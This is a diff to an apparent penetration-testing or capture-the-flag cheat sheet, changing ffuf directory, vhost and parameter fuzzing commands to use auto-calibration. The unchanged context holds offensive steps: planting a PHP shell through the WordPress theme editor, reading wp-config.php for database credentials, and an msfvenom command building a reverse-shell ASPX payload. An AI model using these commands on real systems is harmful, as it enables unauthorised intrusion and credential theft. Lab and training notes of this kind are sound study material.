@@ -102,13 +102,13 @@ nmap -p80 --script http-enum,http-title,http-headers,http-methods $IP
 **Directory brute** (pick one; `-d 2` stops ferox recursing into a phone book)
 ```bash
 feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2 -x php,html,txt -C 404,403
-ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404
+ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac -c
 gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
 ```
 
 **Vhost / subdomain fuzz** (add `<host>` to /etc/hosts first)
 ```bash
-ffuf -u http://$IP -H "Host: FUZZ.<host>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline-size>
+ffuf -u http://$IP -H "Host: FUZZ.<host>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac   # -ach = per host
 ```
 
 **WordPress** — admin panel &rarr; Appearance &rarr; Theme Editor &rarr; 404.php = PHP shell; `wp-config.php` holds the DB creds.
@@ -225,9 +225,11 @@ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
 ```
 
-**Fuzz the parameter, not just the path** — a page that ignores you may just want a different name. Filter on a baseline or every wordlist entry looks like a hit.
+**Fuzz the parameter, not just the path** — a page that ignores you may just want a different name. Let `-ac` work out the baseline for you.
 ```bash
-ffuf -u 'http://$IP/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>
+ffuf -u 'http://$IP/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac -c
+# -ac fires junk values first and filters whatever 'nothing happened' looks like; if a real hit
+# matches the baseline it gets filtered too, so then measure it: -fs size | -fw words | -fc code | -fr regex
 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hw <words> 'http://$IP/index.php?FUZZ=test'
 ```
 
